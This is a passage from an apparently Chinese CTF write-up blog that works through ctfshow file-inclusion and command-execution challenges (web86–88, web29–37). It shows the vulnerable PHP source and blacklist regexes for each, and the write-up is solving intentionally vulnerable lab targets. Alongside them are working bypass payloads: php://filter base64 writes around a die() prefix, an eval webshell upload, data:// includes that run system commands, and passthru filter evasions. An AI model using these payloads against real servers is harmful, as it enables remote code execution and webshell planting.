punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反而去掉了一些限制，只是设置了include的path，还是跑脚本，抓包爆破都可以</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>本题与之前的题不一样了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 21:57:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在过滤了这些的基础上使用了file_put_contents函数</p><ul><li>file_put_contents–将一个字符串写入文件,第一个参数是文件名，第二个参数是写入的字符串（如果选择的文件不存在则创建一个该文件）</li><li>可以看到有url解码，我们可以进行url双编码绕过。</li><li>本题主要的点就是写入的语句是死亡语句，即会执行die，结束后面我们想要执行的传入的content的语句，所以使用php://filter对其进行绕过。具体可参见下面两篇文章</li><li><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">博客1</a><a href="https://xz.aliyun.com/t/8163#toc-3">博客2</a></li></ul><p>主要就是使用php://filter对<?php die('大佬别秀了');?>进行绕过，这里使用base64解码的方法，我们知道，base64解码只对a-z,A-Z,0-9进行解码，所以我们对这一条语句进行解码，那么具有php语句特征的&lt;?&gt;就没有了，这样就不会执行die，（也可以用别的方法，协议，比如rot13），我们要注意，base64解码是以4字节为一组，这里的php die共6个字节，需要自行添加两个才能使其正确解码不影响后面的正常语句解码，</p><p>我们需要使用filter协议write写入一个文件</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;c.php#c.php是自己随意选的%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%33%25%32%65%25%37%30%25%36%38%25%37%30这是两次url编码后的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>同时开启post，传入参数content，</p><pre class="line-numbers language-none"><code class="language-none">content&#x3D;aa&lt;?php phpinfo();?&gt;content&#x3D;aaPD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;这里加的aa就是为了与前面的phpdie结合凑够8个字符进行base64解码，后面的正常base64语句才能正常解码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上传后访问url/c.php：</p><p><img src="/images/image-20210202131642972.png" alt="i"></p><p>说明成功</p><p>为了得到flag，用同样的方式传一个base64编码的一句话木马<?php @eval($_POST[a]); ?>上去getshell，</p><p><img src="/images/image-20210202132015233.png"></p><p>直接访问，可以看到成功，现在再用post传参</p><p><img src="/images/image-20210202132112100.png"></p><p><img src="/images/image-20210202132233573.png"></p><p>查看源代码</p><p><img src="/images/image-20210202132254081.png"></p><p>这道题对死亡函数的绕过算是经典题型了，除了base64的方法也可以好好看看。</p><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-17 02:27:25# @email: h1xa@ctfer.com# @link: https://ctfer.com */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了很多东西，但没有对<code>:</code>进行过滤，所以还是可以用伪协议。挺data即可，使用base64加密</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4#注意，因为对&#x3D;和+有过滤，所以需要去掉base64编码后的&#x3D;和+，<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>还剩两道，暂时就不看了，用到的知识更多一些，后面再来，文件包含先告一段落</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_web入门_命令执行wp</title>
      <link href="/2020/12/02/ctfshow-web-ru-men-ming-ling-zhi-xing-wp/"/>
      <url>/2020/12/02/ctfshow-web-ru-men-ming-ling-zhi-xing-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>过滤了”flag“</p><p>用*绕过就行了,/c?=system(“cat f*&quot;);</p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:42:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了flag和system，使用passthru替代，payload：<code>url/?c=passthru(&quot;cat fl*&quot;);</code>即可</p><p>，跳转后发现没有显示，看一下f12，原来在注释里面，~~~我睿智的搞了半天还以为是没写对，hhh~~~,. </p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了flag,system,php,cat,sort,shell,.还有空格。需要绕过空格，使用URL编码进行绕过空格，使用more（less）命令绕过cat，即可获得flag：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;passthru(&quot;more%09f*&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就可以得到flag了，</p><p><strong><em>注：</em></strong></p><h4 id="编码："><a href="#编码：" class="headerlink" title="编码："></a>编码：</h4><p>很多时候会混淆编码，把URL编码记成了Unicode，还是遇见的太少了，这里做一个记录：</p><pre class="line-numbers language-none"><code class="language-none">1.以%开头的一般是做了URL编码的2.以&amp;#开头的一般是做了Unicode转义处理3.以&amp;#x开头的是做了Unicode 16进制转义4.以\u开头的是一般是UTF-8编码。5.字符串后面以&#x3D;结尾的，通常是做了base64编码处理的。(base编码，不一定是base64)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一道题的基础上过滤了分号，反引号，括号，但是没过滤冒号，使用文件包含获取flag，payload如下：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;include$_GET[&quot;a&quot;]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resourse&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 02:22:27# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">//</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同一个payload打就可以了，但过过滤了引号。所以稍微改一下不加引号就可以了,同时，前一道题也可以用这个payload。</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了冒号，但是是对c的参数进行的过滤，所以后面使用的文件包含并不会被限制，所以可以继续用上一道的payload就可以了</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了等号，还是上面的payload</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:16# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了数字0-9，还是可以用这个payload打通</p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 05:18:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token 